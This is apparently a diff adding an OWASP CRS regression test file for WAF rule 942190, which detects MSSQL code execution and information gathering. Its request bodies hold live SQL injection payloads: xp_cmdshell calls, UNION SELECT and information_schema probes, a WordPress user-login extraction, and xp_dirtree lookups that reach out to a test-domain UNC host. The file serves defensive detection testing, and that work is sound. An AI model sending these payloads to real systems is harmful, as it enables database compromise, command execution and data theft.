@@ -1,0 +1,791 @@
+---
+meta:
+  author: "Christian S.J. Peron, Christoph Hansen, Franziska Bühler"
+  description: None
+  enabled: true
+  name: 942190.yaml
+tests:
+  - test_title: 942190-1
+    desc: "MSSQL code execution and information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: GET
+            port: 80
+            # uri: "/?var=%22%20sleep%281234%22" #triggers 942150 942410 too
+            # uri: "/?var=\" sleep(120\""  # triggers 942330
+            # NB: match with %20 but no bare byte match?
+            uri: "/?var=%20exec%20xp_cmdshell"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-2
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "%22%21%22%0A"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-3
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "%22+union+select%0A"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-4
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "current_user%28%0A"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-5
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "FROM+INFORMATION_SCHEMA.%0A"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-6
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "%27%3BSELECT+P%0A"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-7
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "UnIon+seleCt%0A"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-8
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "%27union%20select%2F%0A"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-9
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "from+information_schema.%0A"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-10
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "select%5D%3Dpolygon%28%28%2F%2A%2100000select%2A%2F%2A%2F%2A%2100000from%2A%2F%28%2F%2A%2100000select%2A%2F%2A%2F%2A%2100000from%2A%2F%28%2F%2A%2100000select%2A%2Fconcat_ws%280x7e3a%2C0x6d616b6d616e%2Cversion%28%29%2Cuser%28%0A"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-11
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "user%28%0A"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-12
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "database%28%0A"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-13
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "select%28user%28%0A"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-14
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "SeLect%2A%2F+1%2C2%2C3%2Cuser%28%0A"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-15
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "select%5D%3D%28ExtractValue%281%2C%28select%2520concat_ws%280x3a%2Cuser%28%0A"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-16
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "from+%60information_schema%60%0A"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-17
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "%27select+H%0A"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-18
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "%27%3Bselect+p%0A"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-19
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "FROM+INFORMATION_SCHEMA.%0A"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-20
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "+EXEC+xp_cmdshell%0A"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-21
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "%22%21+Y%0A"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-22
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "exec+master.%0A"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-23
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "into+outfile+%27%0A"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-24
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "Union+sElect%0A"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-25
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "selectect%2520user%28%0A"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-26
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "+exec+master..xp_cmdshell%0A"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-27
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "selectect%252520user%28%0A"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-28
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "execution%3De1s1%26OlyH%3D9767+AND+1%3D1+UNION+ALL+SELECT+1%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name+FROM+information_schema.tables+WHERE+2%3E1--%2F%2A%2A%2F%3B+EXEC+xp_cmdshell%0A"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-29
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "%27%21%60%0A"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-30
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "%22%20UNION%20ALL%20SELECT%0A"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-31
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "EXec+xp_cmdshell%0A"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-32
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "FrOM+information_schema.%0A"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-33
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "select+1+FROM%28select+count%28%2A%29%2Cconcat%28%28select+%28select+concat%28user%28%0A"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-34
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "%60%211%0A"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-35
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "uNioN++sElecT%0A"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-36
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "%22%3BSELECT+P%0A"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-37
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "pay=UnIoN+SeLeCt%0A"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-38
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=1);declare @q varchar(99);set @q='\\\\j0kwbatxjfgjp0qu3ibonwovamgmkq8h05unittests.corerule' 'set.org\\kph'; exec master.dbo.xp_dirtree @q;--"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-39
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=content.ini);declare @q varchar(99);set @q='\\\\i1kvc9uwkehiqzrt4hcnovpublhunittests.corerule' 'set.org\\lri'; exec master.dbo.xp_dirtree @q;--"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-40
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=EmptyValue', '4', '2', '7');declare @q varchar(99);set @q='\\\\h5nug8yvodlhuyvs8ggmsuttfklkcjunittests.corerule'+'set.org\\vcr'; exec master.dbo.xp_dirtree @q;--"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-41
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=test));declare @q varchar(99);set @q='\\\\zwzc7qpdfvczlgmazy74jckb62cunittests.corrule'+'set.org\\gej'; exec master.dbo.xp_dirtree @q;--"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-42
+    desc: "MySQL SQLi using set variable"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: GET
+            port: 80
+            uri: "/"
+            data: "id=@.:=right(right((select+user_login+from+wordpress.wp_users+limit+1,1),1111),1111)+union%23%0adistinctrow%0bselect@."
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-43
+    desc: "False positive UNION #2047"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: GET
+            port: 80
+            uri: "/"
+            data: "arg=Die%20%22Union%20von%20Europa%22"
+            version: HTTP/1.0
+          output:
+            no_log_contains: id "942190"
+  - test_title: 942190-44
+    desc: "MSSQL Logical Functions - IIF (Transact-SQL) - regression test"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: GET
+            port: 80
+            uri: "/"
+            data: "arg=SELECT%20IIF(1%20%3E%201%2C%20'TRUE'%2C%20'FALSE'%20)"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-45
+    desc: "False positive IIF"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: GET
+            port: 80
+            uri: "/"
+            data: "arg=it%20is%20my%20beliif%20%28stemming%20from%20personal%20experience%29%2C%20that"
+            version: HTTP/1.0
+          output:
+            no_log_contains: id "942190"
+  - test_title: 942190-46
+    desc: "False positive (word boundary)"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: GET
+            port: 80
+            uri: "/"
+            data: "arg=appUser(sitename,user)"
+            version: HTTP/1.0
+          output:
+            no_log_contains: id "942190"
